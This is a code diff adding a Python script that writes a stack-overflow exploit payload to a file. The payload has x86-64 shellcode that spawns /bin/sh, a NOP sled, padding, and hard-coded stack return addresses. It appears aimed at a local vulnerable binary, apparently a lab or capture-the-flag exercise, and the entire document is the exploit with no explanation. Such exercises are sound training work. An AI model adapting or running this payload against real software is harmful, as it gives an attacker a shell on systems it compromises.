@@ -1,0 +1,17 @@
+import struct
+
+shellcode64 = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
+
+nop= "\x90"
+fn= "payload3"
+payload = ""
+
+rip = "\x10\xe5\xff\xff\xff\x7f"
+payload += nop * 16
+payload += shellcode64  # NopSled
+payload += nop* (80 - len(payload))
+payload += "\x60\xe5\xff\xff\xff\x7f\x00\x00"
+payload += rip
+
+with open(fn, "wb") as f:
+    f.write(payload.encode('latin-1'))
